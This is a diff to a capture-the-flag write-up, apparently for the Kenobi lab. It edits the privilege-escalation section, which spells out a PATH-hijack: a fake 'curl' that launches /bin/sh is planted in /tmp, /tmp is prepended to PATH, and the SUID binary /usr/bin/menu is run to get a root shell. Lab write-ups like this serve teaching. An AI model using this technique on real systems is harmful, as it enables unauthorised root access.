@@ -328,6 +328,9 @@ kenobi@kenobi:~$ /usr/bin/menu
 ```
 ### We need to manipulating the path to gain a root shell as usual
 ```
+cd /tmp
+```
+```
 echo /bin/sh > curl
 ```
 ```
@@ -337,7 +340,9 @@ chmod 777 curl
 export PATH=/tmp:$PATH
 ```
 ```
-/usr.bin.menu
+/usr/bin/menu
+```
+```
 ```
 
 ## Root Flag
